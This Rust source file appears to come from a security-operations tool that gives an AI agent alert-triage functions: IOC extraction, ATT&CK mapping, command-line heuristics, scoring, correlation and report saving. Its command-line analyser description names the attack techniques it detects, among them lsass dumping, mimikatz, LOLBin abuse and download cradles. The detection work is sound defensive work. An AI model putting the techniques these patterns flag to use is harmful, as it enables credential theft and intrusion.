//! The intel engine exposed as agent tools (`talon_core::tool::Tool`).
//!
//! | tool | concurrency | purpose |
//! |---|---|---|
//! | `extract_iocs` | read-only | IOCs from text / JSON |
//! | `map_mitre` | read-only | ATT&CK candidates for an alert / lookups |
//! | `analyze_command_line` | read-only | command-line + process-tree heuristics |
//! | `score_alert` | read-only | deterministic risk prior |
//! | `correlate_alerts` | read-only | cluster related alerts |
//! | `investigation_hints` | read-only | per-alert-type investigation guidance |
//! | `submit_triage_report` | exclusive | validate + persist the final verdict |
//!
//! Outputs are compact JSON (except `submit_triage_report`, which returns
//! the rendered Markdown). They quote alert content and must be fenced as
//! untrusted data by the agent loop.

use std::io;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};

use async_trait::async_trait;
use serde::Serialize;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use talon_core::tool::{Tool, ToolConcurrency, ToolContext, ToolOutput, ToolSpec};

use crate::alert::AlertFields;
use crate::analysis::{analyze_alert, triage_input};
use crate::cmdline::{self, ProcessContext};
use crate::correlate::{CorrelationOptions, correlate_alerts};
use crate::hints;
use crate::ioc::{ExtractOptions, IocExtractor, IocType};
use crate::mitre::{self, Tactic};
use crate::report::{self, TriageReport};
use crate::triage::{self, AssetCriticality, IntelVerdict, IocSummary, TriageContext, TriageInput};

/// Options for [`intel_tools`].
#[derive(Debug, Clone)]
pub struct IntelToolOptions {
    /// Where `submit_triage_report` writes; `None` = `<ctx.cwd>/reports`.
    pub reports_dir: Option<PathBuf>,
    /// Maximum serialized size of any tool input.
    pub max_input_bytes: usize,
    /// Default correlation window.
    pub default_window_minutes: u32,
    /// Maximum alerts accepted by `correlate_alerts`.
    pub max_alerts: usize,
}

impl Default for IntelToolOptions {
    fn default() -> Self {
        Self {
            reports_dir: None,
            max_input_bytes: 2 * 1024 * 1024,
            default_window_minutes: 60,
            max_alerts: 500,
        }
    }
}

/// All intel tools.
pub fn intel_tools(opts: IntelToolOptions) -> Vec<Arc<dyn Tool>> {
    let o = Arc::new(opts);
    vec![
        Arc::new(ExtractIocsTool(o.clone())),
        Arc::new(MapMitreTool(o.clone())),
        Arc::new(AnalyzeCommandLineTool(o.clone())),
        Arc::new(ScoreAlertTool(o.clone())),
        Arc::new(CorrelateAlertsTool(o.clone())),
        Arc::new(InvestigationHintsTool(o.clone())),
        Arc::new(SubmitTriageReportTool(o)),
    ]
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

struct ByteCounter(usize);

impl io::Write for ByteCounter {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        self.0 += buf.len();
        Ok(buf.len())
    }
    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

fn check_size(args: &Value, max: usize) -> Result<(), String> {
    let mut c = ByteCounter(0);
    serde_json::to_writer(&mut c, args).map_err(|e| format!("invalid arguments: {e}"))?;
    if c.0 > max {
        return Err(format!(
            "input too large ({} bytes > {max}); send a smaller excerpt",
            c.0
        ));
    }
    Ok(())
}

fn ok_json(v: &impl Serialize) -> ToolOutput {
    match serde_json::to_string(v) {
        Ok(s) => ToolOutput::ok(s),
        Err(e) => ToolOutput::err(format!("failed to serialize result: {e}")),
    }
}

fn str_arg<'a>(args: &'a Value, key: &str) -> Option<&'a str> {
    args.get(key)
        .and_then(Value::as_str)
        .filter(|s| !s.trim().is_empty())
}

fn str_list(args: &Value, key: &str) -> Result<Vec<String>, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(Vec::new()),
        Some(Value::Array(a)) => a
            .iter()
            .map(|v| {
                v.as_str()
                    .map(|s| s.trim().to_string())
                    .ok_or_else(|| format!("`{key}` must be an array of strings"))
            })
            .collect(),
        Some(Value::String(s)) => Ok(s
            .split(',')
            .map(|p| p.trim().to_string())
            .filter(|p| !p.is_empty())
            .collect()),
        Some(_) => Err(format!("`{key}` must be an array of strings")),
    }
}

fn u64_arg(args: &Value, key: &str) -> Result<Option<u64>, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(Value::Number(n)) => n
            .as_u64()
            .map(Some)
            .ok_or_else(|| format!("`{key}` must be a non-negative integer")),
        Some(Value::String(s)) => s
            .trim()
            .parse::<u64>()
            .map(Some)
            .map_err(|_| format!("`{key}` must be a non-negative integer")),
        Some(_) => Err(format!("`{key}` must be a non-negative integer")),
    }
}

fn bool_arg(args: &Value, key: &str) -> Result<Option<bool>, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(Value::Bool(b)) => Ok(Some(*b)),
        Some(_) => Err(format!("`{key}` must be a boolean")),
    }
}

/// An alert argument: an object, or a JSON string containing one.
fn alert_arg(args: &Value, key: &str) -> Result<Option<Value>, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(v @ Value::Object(_)) => Ok(Some(v.clone())),
        Some(Value::String(s)) => match serde_json::from_str::<Value>(s) {
            Ok(v @ Value::Object(_)) => Ok(Some(v)),
            _ => Err(format!(
                "`{key}` must be a JSON object (the raw alert document)"
            )),
        },
        Some(_) => Err(format!(
            "`{key}` must be a JSON object (the raw alert document)"
        )),
    }
}

fn enum_arg<T: serde::de::DeserializeOwned>(args: &Value, key: &str) -> Result<Option<T>, String> {
    match args.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(v) => serde_json::from_value::<T>(Value::String(
            v.as_str().unwrap_or_default().trim().to_ascii_lowercase(),
        ))
        .map(Some)
        .map_err(|_| format!("invalid `{key}` value {v}")),
    }
}

fn triage_context(args: &Value) -> Result<TriageContext, String> {
    Ok(TriageContext {
        asset_criticality: enum_arg::<AssetCriticality>(args, "asset_criticality")?
            .unwrap_or_default(),
        prior_sightings: u64_arg(args, "prior_sightings")?
            .map(|n| n.min(u64::from(u32::MAX)) as u32)
            .unwrap_or(0),
        known_false_positive: bool_arg(args, "known_false_positive")?.unwrap_or(false),
        intel_verdict: enum_arg::<IntelVerdict>(args, "intel_verdict")?,
    })
}

fn ioc_type_names() -> Vec<&'static str> {
    IocType::ALL.iter().map(|t| t.as_str()).collect()
}

fn alert_schema(description: &str) -> Value {
    json!({"type": ["object", "string"], "description": description})
}

// ---------------------------------------------------------------------------
// extract_iocs
// ---------------------------------------------------------------------------

struct ExtractIocsTool(Arc<IntelToolOptions>);

#[async_trait]
impl Tool for ExtractIocsTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "extract_iocs".into(),
            description: "Extract, refang, normalise, classify and deduplicate indicators of compromise from free text or a JSON document (e.g. a raw Wazuh/OpenSearch alert). Field-aware for alerts: Sysmon `hashes` are split by algorithm, `queryName` is treated as a host name, version fields never yield IPs, and Wazuh infrastructure fields (agent.*, manager.*, rule.groups, location) are skipped. Each IOC has type, value, count, source field paths, scope (public/private/... for IPs, external/internal for names) and `enrichable` (worth a threat-intel lookup). Types: ipv4, ipv6, domain, url, email, md5, sha1, sha256, sha512, imphash, cve, mitre_technique, windows_path, unix_path, registry_key, user_agent.".into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "text": {"type": "string", "description": "Free text (logs, reports, command lines). JSON text is parsed and handled field-aware."},
                    "json": {"type": ["object", "array"], "description": "A JSON document such as a raw alert."},
                    "types": {"type": "array", "items": {"type": "string", "enum": ioc_type_names()}, "description": "Only return these types."},
                    "enrichable_only": {"type": "boolean", "description": "Only external network indicators, hashes and CVEs (default false)."},
                    "include_infrastructure": {"type": "boolean", "description": "Also scan agent/manager/rule metadata fields (default false)."},
                    "max_results": {"type": "integer", "minimum": 1, "maximum": 1000, "description": "Default 200."}
                },
                "additionalProperties": false
            }),
        }
    }

    fn concurrency(&self) -> ToolConcurrency {
        ToolConcurrency::ReadOnly
    }

    async fn call(&self, args: Value, _ctx: &ToolContext) -> ToolOutput {
        match extract_iocs(&args, &self.0) {
            Ok(v) => ToolOutput::ok(v.to_string()),
            Err(e) => ToolOutput::err(e),
        }
    }
}

fn extract_iocs(args: &Value, o: &IntelToolOptions) -> Result<Value, String> {
    check_size(args, o.max_input_bytes)?;
    let types = str_list(args, "types")?
        .iter()
        .map(|t| IocType::parse(t).ok_or_else(|| format!("unknown IOC type {t:?}")))
        .collect::<Result<std::collections::BTreeSet<_>, _>>()?;
    let max = u64_arg(args, "max_results")?.unwrap_or(200).clamp(1, 1000) as usize;
    let mut x = IocExtractor::new(ExtractOptions {
        types: (!types.is_empty()).then_some(types),
        max_iocs: 1000,
        skip_infrastructure_fields: !bool_arg(args, "include_infrastructure")?.unwrap_or(false),
        ..Default::default()
    });
    let mut any = false;
    if let Some(t) = args.get("text").and_then(Value::as_str) {
        any = true;
        match serde_json::from_str::<Value>(t.trim()) {
            Ok(v @ (Value::Object(_) | Value::Array(_))) => x.add_json(&v),
            _ => x.add_text(t, None),
        }
    }
    if let Some(j) = args.get("json").filter(|v| !v.is_null()) {
        any = true;
        x.add_json(j);
    }
    if !any {
        return Err("provide `text` or `json`".into());
    }
    let report = x.finish();
    let enrichable_only = bool_arg(args, "enrichable_only")?.unwrap_or(false);
    let selected: Vec<&crate::ioc::Ioc> = report
        .iocs
        .iter()
        .filter(|i| !enrichable_only || i.is_enrichable())
        .collect();
    let total = selected.len();
    let items: Vec<Value> = selected
        .iter()
        .take(max)
        .map(|i| {
            let mut v = serde_json::to_value(i).unwrap_or(Value::Null);
            if let Some(o) = v.as_object_mut() {
                o.insert("enrichable".into(), Value::Bool(i.is_enrichable()));
            }
            v
        })
        .collect();
    let by_type: serde_json::Map<String, Value> = report
        .counts()
        .into_iter()
        .map(|(t, n)| (t.as_str().to_string(), json!(n)))
        .collect();
    Ok(json!({
        "count": total,
        "returned": items.len(),
        "truncated": report.truncated || total > items.len(),
        "by_type": by_type,
        "iocs": items
    }))
}

// ---------------------------------------------------------------------------
// map_mitre
// ---------------------------------------------------------------------------

struct MapMitreTool(Arc<IntelToolOptions>);

#[async_trait]
impl Tool for MapMitreTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "map_mitre".into(),
            description: "Map an alert to MITRE ATT&CK techniques with confidence and explanations, from Wazuh rule.mitre.id tags (high), field evidence such as lsass access or Run-key writes (high/medium), Sysmon/Windows event ids and rule groups (low/medium candidates) and command-line heuristics. Also looks up technique ids (name, tactics) in the embedded ATT&CK table. Pass the raw alert, or individual signals.".into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "alert": alert_schema("Raw alert document (nested Wazuh, Graylog-flattened or OpenSearch hit)."),
                    "technique_ids": {"type": "array", "items": {"type": "string"}, "description": "Technique ids to look up (e.g. T1059.001)."},
                    "rule_groups": {"type": "array", "items": {"type": "string"}},
                    "event_id": {"type": "integer", "minimum": 0},
                    "command_line": {"type": "string"}
                },
                "additionalProperties": false
            }),
        }
    }

    fn concurrency(&self) -> ToolConcurrency {
        ToolConcurrency::ReadOnly
    }

    async fn call(&self, args: Value, _ctx: &ToolContext) -> ToolOutput {
        match map_mitre(&args, &self.0) {
            Ok(v) => ToolOutput::ok(v.to_string()),
            Err(e) => ToolOutput::err(e),
        }
    }
}

fn map_mitre(args: &Value, o: &IntelToolOptions) -> Result<Value, String> {
    check_size(args, o.max_input_bytes)?;
    let alert = alert_arg(args, "alert")?;
    let mut fields = alert
        .as_ref()
        .map(AlertFields::from_json)
        .unwrap_or_default();
    fields.rule_groups.extend(str_list(args, "rule_groups")?);
    if let Some(e) = u64_arg(args, "event_id")? {
        fields.event_id = u32::try_from(e).ok();
    }
    if let Some(c) = str_arg(args, "command_line") {
        fields.command_line = Some(c.to_string());
    }
    let lookups: Vec<Value> = str_list(args, "technique_ids")?
        .iter()
        .map(|id| match mitre::technique(id) {
            Some(t) => json!({"technique_id": t.id, "known": true, "name": t.full_name(), "tactics": t.tactics}),
            None => json!({"technique_id": id.to_ascii_uppercase(), "known": false,
                           "valid_format": mitre::is_technique_id(id.trim()),
                           "tactics": mitre::tactics_for(id)}),
        })
        .collect();
    let has_signal = alert.is_some()
        || !fields.rule_groups.is_empty()
        || fields.event_id.is_some()
        || fields.command_line.is_some();
    if !has_signal && lookups.is_empty() {
        return Err(
            "provide `alert`, `rule_groups`, `event_id`, `command_line` or `technique_ids`".into(),
        );
    }
    let mappings = if has_signal {
        mitre::map_alert(&fields)
    } else {
        Vec::new()
    };
    Ok(json!({
        "mappings": mappings,
        "tactics": mitre::tactics_of(&mappings),
        "lookups": lookups
    }))
}

// ---------------------------------------------------------------------------
// analyze_command_line
// ---------------------------------------------------------------------------

struct AnalyzeCommandLineTool(Arc<IntelToolOptions>);

#[async_trait]
impl Tool for AnalyzeCommandLineTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "analyze_command_line".into(),
            description: "Deterministically analyse a process command line (Windows or Unix, also PowerShell script text): LOLBin abuse (certutil, mshta, rundll32, regsvr32, bitsadmin, wmic, schtasks, ...), credential theft (lsass dumps, mimikatz, NTDS, SAM), shadow-copy/backup deletion, persistence, discovery, obfuscation (carets, backticks, concatenation, [char], env-var substrings, random case), entropy, download cradles; decodes -EncodedCommand and base64 literals and analyses the decoded payload. With image/parent_image it also checks parent/child chains (Office -> PowerShell), masquerading and user-writable locations. Returns a 0-100 score, findings with weights and ATT&CK ids, decoded payloads and their IOCs.".into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "command_line": {"type": "string", "description": "The command line or script text."},
                    "image": {"type": "string", "description": "Process image path (data_win_eventdata_image)."},
                    "parent_image": {"type": "string", "description": "Parent image path (data_win_eventdata_parentImage)."}
                },
                "required": ["command_line"],
                "additionalProperties": false
            }),
        }
    }

    fn concurrency(&self) -> ToolConcurrency {
        ToolConcurrency::ReadOnly
    }

    async fn call(&self, args: Value, _ctx: &ToolContext) -> ToolOutput {
        match analyze_cmd(&args, &self.0) {
            Ok(v) => ToolOutput::ok(v.to_string()),
            Err(e) => ToolOutput::err(e),
        }
    }
}

fn analyze_cmd(args: &Value, o: &IntelToolOptions) -> Result<Value, String> {
    check_size(args, o.max_input_bytes)?;
    let cmd = args
        .get("command_line")
        .and_then(Value::as_str)
        .ok_or("`command_line` (string) is required")?;
    let ctx = ProcessContext {
        image: str_arg(args, "image"),
        parent_image: str_arg(args, "parent_image"),
        command_line: Some(cmd),
        parent_command_line: None,
    };
    let analysis = cmdline::analyze_process(&ctx);
    let mut x = IocExtractor::new(ExtractOptions {
        max_iocs: 200,
        ..Default::default()
    });
    x.add_text(cmd, Some("command_line"));
    for (i, d) in analysis.decoded.iter().enumerate() {
        x.add_text(&d.text, Some(&format!("decoded[{i}]")));
    }
    let iocs = x.finish();
    let mitre = mitre::merge_mappings(mitre::map_command_line_analysis(&analysis));
    let mut v = serde_json::to_value(&analysis).map_err(|e| e.to_string())?;
    if let Some(obj) = v.as_object_mut() {
        obj.insert("verdict_hint".into(), json!(analysis.verdict_hint()));
        obj.insert(
            "iocs".into(),
            serde_json::to_value(&iocs.iocs).unwrap_or(Value::Null),
        );
        obj.insert(
            "mitre".into(),
            serde_json::to_value(&mitre).unwrap_or(Value::Null),
        );
    }
    Ok(v)
}

// ---------------------------------------------------------------------------
// score_alert
// ---------------------------------------------------------------------------

struct ScoreAlertTool(Arc<IntelToolOptions>);

#[async_trait]
impl Tool for ScoreAlertTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "score_alert".into(),
            description: "Compute a deterministic, explainable risk prior (0-100, severity, confidence, per-factor rationale) for an alert from rule level, rule groups, ATT&CK tactics, IOC classes, command-line analysis, asset criticality, prior sightings and (after enrichment) the threat-intel verdict. Monotonic: worse inputs never lower the score. Use it as a grounded starting point, then confirm with evidence. Pass the raw alert, or individual fields.".into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "alert": alert_schema("Raw alert document."),
                    "rule_level": {"type": "integer", "minimum": 0, "maximum": 15},
                    "rule_groups": {"type": "array", "items": {"type": "string"}},
                    "mitre_ids": {"type": "array", "items": {"type": "string"}},
                    "tactics": {"type": "array", "items": {"type": "string"}},
                    "command_line": {"type": "string"},
                    "asset_criticality": {"type": "string", "enum": ["unknown", "low", "medium", "high", "critical"]},
                    "prior_sightings": {"type": "integer", "minimum": 0, "description": "How often this alert's IOCs/rule were seen before on the asset (MemPalace / IOC history)."},
                    "known_false_positive": {"type": "boolean", "description": "MemPalace has a recorded false-positive pattern for this rule/asset."},
                    "intel_verdict": {"type": "string", "enum": ["clean", "unknown", "suspicious", "malicious"], "description": "Worst threat-intel verdict across the alert's IOCs, once enriched."}
                },
                "additionalProperties": false
            }),
        }
    }

    fn concurrency(&self) -> ToolConcurrency {
        ToolConcurrency::ReadOnly
    }

    async fn call(&self, args: Value, _ctx: &ToolContext) -> ToolOutput {
        match score_alert(&args, &self.0) {
            Ok(v) => ToolOutput::ok(v.to_string()),
            Err(e) => ToolOutput::err(e),
        }
    }
}

fn score_alert(args: &Value, o: &IntelToolOptions) -> Result<Value, String> {
    check_size(args, o.max_input_bytes)?;
    let ctx = triage_context(args)?;
    if let Some(alert) = alert_arg(args, "alert")? {
        let a = analyze_alert(&alert, &ctx);
        let input = triage_input(&a.alert, &a.iocs, &a.mitre, a.process.as_ref(), &ctx);
        return Ok(json!({
            "triage": a.triage,
            "derived": {
                "rule_level": input.rule_level,
                "tactics": input.tactics,
                "iocs": input.iocs,
                "command_line_score": input.command_line_score,
                "mitre": a.mitre.iter().map(|m| json!({"technique_id": m.technique_id, "confidence": m.confidence})).collect::<Vec<_>>()
            }
        }));
    }
    let rule_level = match u64_arg(args, "rule_level")? {
        Some(l) if l > 15 => return Err("`rule_level` must be 0-15".into()),
        Some(l) => Some(l as u8),
        None => None,
    };
    let mut tactics: Vec<Tactic> = Vec::new();
    for id in str_list(args, "mitre_ids")? {
        tactics.extend(mitre::tactics_for(&id));
    }
    for t in str_list(args, "tactics")? {
        tactics.push(Tactic::parse(&t).ok_or_else(|| format!("unknown tactic {t:?}"))?);
    }
    let mut iocs = IocSummary::default();
    let mut cmd_score = None;
    let mut cmd_findings = Vec::new();
    if let Some(cmd) = str_arg(args, "command_line") {
        let a = cmdline::analyze_command_line(cmd);
        cmd_score = Some(a.score);
        cmd_findings = a.findings.iter().map(|f| f.title.clone()).collect();
        tactics.extend(
            mitre::map_command_line_analysis(&a)
                .iter()
                .filter(|m| m.confidence >= crate::Confidence::Medium)
                .flat_map(|m| m.tactics.clone()),
        );
        iocs = IocSummary::from_report(&crate::ioc::extract_from_text(cmd));
    }
    let input = TriageInput {
        rule_level,
        rule_groups: str_list(args, "rule_groups")?,
        tactics,
        iocs,
        command_line_score: cmd_score,
        command_line_findings: cmd_findings,
        asset_criticality: ctx.asset_criticality,
        prior_sightings: ctx.prior_sightings,
        known_false_positive: ctx.known_false_positive,
        intel_verdict: ctx.intel_verdict,
    };
    if input.rule_level.is_none()
        && input.tactics.is_empty()
        && input.command_line_score.is_none()
        && input.rule_groups.is_empty()
    {
        return Err("provide `alert` or at least one of rule_level, rule_groups, mitre_ids, tactics, command_line".into());
    }
    Ok(json!({"triage": triage::score(&input)}))
}

// ---------------------------------------------------------------------------
// correlate_alerts
// ---------------------------------------------------------------------------

struct CorrelateAlertsTool(Arc<IntelToolOptions>);

#[async_trait]
impl Tool for CorrelateAlertsTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "correlate_alerts".into(),
            description: "Cluster raw alerts that share a host, a (non-system) user or a pivotable indicator (IP, domain, URL, e-mail, file hash) within a time window, single-linkage. Entities present in too many alerts are suppressed and reported. Each cluster lists members, time span, hosts, users, shared entities, tactics and deterministic observations (same IOC on several hosts, account on several hosts, multi-stage activity).".into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "alerts": {"type": "array", "items": {"type": "object"}, "minItems": 1, "maxItems": self.0.max_alerts, "description": "Raw alert documents (each should carry a timestamp and _id/id)."},
                    "window_minutes": {"type": "integer", "minimum": 1, "maximum": 10080, "description": "Maximum gap between linked alerts (default 60)."},
                    "link_on": {"type": "array", "items": {"type": "string", "enum": ["host", "user", "ioc"]}, "description": "Entity kinds to link on (default all)."},
                    "max_entity_fanout": {"type": "integer", "minimum": 2, "description": "Ignore entities present in more alerts than this (default 50)."},
                    "include_singletons": {"type": "boolean"}
                },
                "required": ["alerts"],
                "additionalProperties": false
            }),
        }
    }

    fn concurrency(&self) -> ToolConcurrency {
        ToolConcurrency::ReadOnly
    }

    async fn call(&self, args: Value, _ctx: &ToolContext) -> ToolOutput {
        match correlate(&args, &self.0) {
            Ok(v) => ok_json(&v),
            Err(e) => ToolOutput::err(e),
        }
    }
}

fn correlate(
    args: &Value,
    o: &IntelToolOptions,
) -> Result<crate::correlate::CorrelationResult, String> {
    check_size(args, o.max_input_bytes)?;
    let alerts = args
        .get("alerts")
        .and_then(Value::as_array)
        .ok_or("`alerts` (array of alert objects) is required")?;
    if alerts.is_empty() {
        return Err("`alerts` is empty".into());
    }
    if alerts.len() > o.max_alerts {
        return Err(format!(
            "too many alerts ({} > {})",
            alerts.len(),
            o.max_alerts
        ));
    }
    let alerts: Vec<Value> = alerts
        .iter()
        .map(|a| match a {
            Value::String(s) => serde_json::from_str(s).unwrap_or(Value::Null),
            other => other.clone(),
        })
        .collect();
    let window = u64_arg(args, "window_minutes")?
        .unwrap_or(u64::from(o.default_window_minutes))
        .clamp(1, 10_080);
    let link = str_list(args, "link_on")?;
    for l in &link {
        if !["host", "user", "ioc"].contains(&l.as_str()) {
            return Err(format!("unknown link_on value {l:?}"));
        }
    }
    let on = |k: &str| link.is_empty() || link.iter().any(|l| l == k);
    let opts = CorrelationOptions {
        window: chrono::Duration::minutes(window as i64),
        max_entity_fanout: u64_arg(args, "max_entity_fanout")?.map_or(50, |n| n.max(2) as usize),
        include_singletons: bool_arg(args, "include_singletons")?.unwrap_or(false),
        link_host: on("host"),
        link_user: on("user"),
        link_ioc: on("ioc"),
    };
    Ok(correlate_alerts(&alerts, &opts))
}

// ---------------------------------------------------------------------------
// investigation_hints
// ---------------------------------------------------------------------------

struct InvestigationHintsTool(Arc<IntelToolOptions>);

#[async_trait]
impl Tool for InvestigationHintsTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "investigation_hints".into(),
            description: "Alert-type specific investigation guidance (which fields to inspect, red flags, live-forensics artifacts) and the matching prompt template in /workspace/group/prompts/, for Sysmon event ids, Windows Security / Defender events and Wazuh rule groups. Pass the raw alert or rule_groups + event_id.".into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "alert": alert_schema("Raw alert document."),
                    "rule_groups": {"type": "array", "items": {"type": "string"}},
                    "event_id": {"type": "integer", "minimum": 0},
                    "rule_description": {"type": "string"}
                },
                "additionalProperties": false
            }),
        }
    }

    fn concurrency(&self) -> ToolConcurrency {
        ToolConcurrency::ReadOnly
    }

    async fn call(&self, args: Value, _ctx: &ToolContext) -> ToolOutput {
        let run = || -> Result<Value, String> {
            check_size(&args, self.0.max_input_bytes)?;
            let fields = alert_arg(&args, "alert")?
                .map(|a| AlertFields::from_json(&a))
                .unwrap_or_default();
            let mut groups = fields.rule_groups.clone();
            groups.extend(str_list(&args, "rule_groups")?);
            let event = match u64_arg(&args, "event_id")? {
                Some(e) => u32::try_from(e).ok(),
                None => fields.effective_event_id(),
            };
            let desc = str_arg(&args, "rule_description")
                .map(str::to_string)
                .or(fields.rule_description.clone());
            Ok(json!({
                "templates": hints::template_candidates(&groups, event, desc.as_deref()),
                "hints": hints::investigation_hints(&groups, event)
            }))
        };
        match run() {
            Ok(v) => ToolOutput::ok(v.to_string()),
            Err(e) => ToolOutput::err(e),
        }
    }
}

// ---------------------------------------------------------------------------
// submit_triage_report
// ---------------------------------------------------------------------------

struct SubmitTriageReportTool(Arc<IntelToolOptions>);

/// Validate a caller-supplied report id (`[A-Za-z0-9._-]`, 1–128, no
/// leading dot).
fn valid_report_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 128
        && !id.starts_with('.')
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Derive a safe file id from an alert id.
fn derive_report_id(alert_id: &str) -> String {
    let mut s: String = alert_id
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '_'
            }
        })
        .take(100)
        .collect();
    while s.starts_with('.') {
        s.remove(0);
    }
    if s.is_empty() {
        s = "report".into();
    }
    s
}

async fn write_atomic(path: &Path, data: &[u8]) -> io::Result<()> {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let file_name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "report".into());
    let tmp = path.with_file_name(format!(".{file_name}.{}.{nanos}.tmp", std::process::id()));
    tokio::fs::write(&tmp, data).await?;
    if let Err(e) = tokio::fs::rename(&tmp, path).await {
        let _ = tokio::fs::remove_file(&tmp).await;
        return Err(e);
    }
    Ok(())
}

#[async_trait]
impl Tool for SubmitTriageReportTool {
    fn spec(&self) -> ToolSpec {
        ToolSpec {
            name: "submit_triage_report".into(),
            description: "Submit the final structured triage verdict for an alert. The report is validated (schema, IOC formats, ATT&CK ids, verdict/severity coherence), sanitised (refanged IOCs, control characters stripped, duplicates removed) and saved as reports/<id>.json and reports/<id>.md in the group folder. Returns the rendered Markdown (use it for the analyst message and CoPilot report_markdown) or the list of problems to fix. Call it once, at the end of the investigation, after de-anonymising values.".into(),
            parameters: json!({
                "type": "object",
                "properties": {
                    "report": report::json_schema(),
                    "report_id": {"type": "string", "description": "File id ([A-Za-z0-9._-], max 128); defaults to the alert_id."}
                },
                "required": ["report"],
                "additionalProperties": false
            }),
        }
    }

    async fn call(&self, args: Value, ctx: &ToolContext) -> ToolOutput {
        if ctx.cancel.is_cancelled() {
            return ToolOutput::err("cancelled");
        }
        if let Err(e) = check_size(&args, self.0.max_input_bytes) {
            return ToolOutput::err(e);
        }
        let Some(raw) = args.get("report") else {
            return ToolOutput::err("`report` is required");
        };
        let mut report = match TriageReport::from_json(raw) {
            Ok(r) => r,
            Err(e) => return ToolOutput::err(e),
        };
        report.sanitize();
        let validation = report.validate();
        if !validation.is_ok() {
            return ToolOutput::err(format!(
                "report rejected; fix these problems and submit again:\n{}",
                validation.render()
            ));
        }
        let id = match str_arg(&args, "report_id") {
            Some(id) if valid_report_id(id.trim()) => id.trim().to_string(),
            Some(id) => {
                return ToolOutput::err(format!(
                    "invalid report_id {id:?}: use [A-Za-z0-9._-], max 128, no leading dot"
                ));
            }
            None => derive_report_id(&report.alert_id),
        };
        let dir = self
            .0
            .reports_dir
            .clone()
            .unwrap_or_else(|| ctx.cwd.join("reports"));
        match tokio::fs::symlink_metadata(&dir).await {
            Ok(m) if m.file_type().is_symlink() || !m.is_dir() => {
                return ToolOutput::err(format!("{} is not a regular directory", dir.display()));
            }
            Ok(_) => {}
            Err(e) if e.kind() == io::ErrorKind::NotFound => {
                if let Err(e) = tokio::fs::create_dir_all(&dir).await {
                    return ToolOutput::err(format!("cannot create {}: {e}", dir.display()));
                }
            }
            Err(e) => return ToolOutput::err(format!("cannot access {}: {e}", dir.display())),
        }
        let json_bytes = match serde_json::to_vec_pretty(&report) {
            Ok(b) => b,
            Err(e) => return ToolOutput::err(format!("failed to serialize report: {e}")),
        };
        let markdown = report.to_markdown();
        let json_path = dir.join(format!("{id}.json"));
        let md_path = dir.join(format!("{id}.md"));
        for (path, data) in [
            (&json_path, json_bytes.as_slice()),
            (&md_path, markdown.as_bytes()),
        ] {
            if let Err(e) = write_atomic(path, data).await {
                return ToolOutput::err(format!("failed to write {}: {e}", path.display()));
            }
        }
        let digest = hex::encode(Sha256::digest(&json_bytes));
        tracing::info!(report_id = %id, verdict = ?report.verdict, severity = %report.severity.as_str(), "triage report saved");
        let mut out = format!(
            "Report saved: {} and {} (sha256 {digest}).\nCoPilot severity_assessment: {}\n",
            json_path.display(),
            md_path.display(),
            report.severity.label()
        );
        if !validation.warnings.is_empty() {
            out.push_str("Warnings (saved anyway; resubmit if they reveal a mistake):\n");
            out.push_str(&validation.render());
        }
        out.push('\n');
        out.push_str(&markdown);
        ToolOutput::ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio_util::sync::CancellationToken;

    fn ctx(dir: &Path) -> ToolContext {
        ToolContext {
            cwd: dir.to_path_buf(),
            allowed_roots: vec![dir.to_path_buf()],
            read_only_roots: vec![],
            group_folder: "copilot".into(),
            chat_jid: "http:copilot".into(),
            is_main: false,
            ipc_dir: dir.join("ipc"),
            cancel: CancellationToken::new(),
        }
    }

    fn tool(name: &str) -> Arc<dyn Tool> {
        intel_tools(IntelToolOptions::default())
            .into_iter()
            .find(|t| t.spec().name == name)
            .unwrap_or_else(|| panic!("{name} missing"))
    }

    fn parse(o: &ToolOutput) -> Value {
        assert!(!o.is_error, "{}", o.content);
        serde_json::from_str(&o.content).unwrap()
    }

    #[test]
    fn specs_are_well_formed() {
        let tools = intel_tools(IntelToolOptions::default());
        let names: Vec<String> = tools.iter().map(|t| t.spec().name).collect();
        assert_eq!(
            names,
            vec![
                "extract_iocs",
                "map_mitre",
                "analyze_command_line",
                "score_alert",
                "correlate_alerts",
                "investigation_hints",
                "submit_triage_report"
            ]
        );
        let name_re = regex::Regex::new(r"^[a-zA-Z0-9_-]{1,64}$").unwrap();
        for t in &tools {
            let s = t.spec();
            assert!(name_re.is_match(&s.name));
            assert!(s.description.len() > 40);
            assert_eq!(s.parameters["type"], "object");
            assert_eq!(s.parameters["additionalProperties"], false);
            let expected = if s.name == "submit_triage_report" {
                ToolConcurrency::Exclusive
            } else {
                ToolConcurrency::ReadOnly
            };
            assert_eq!(t.concurrency(), expected, "{}", s.name);
        }
    }

    #[tokio::test]
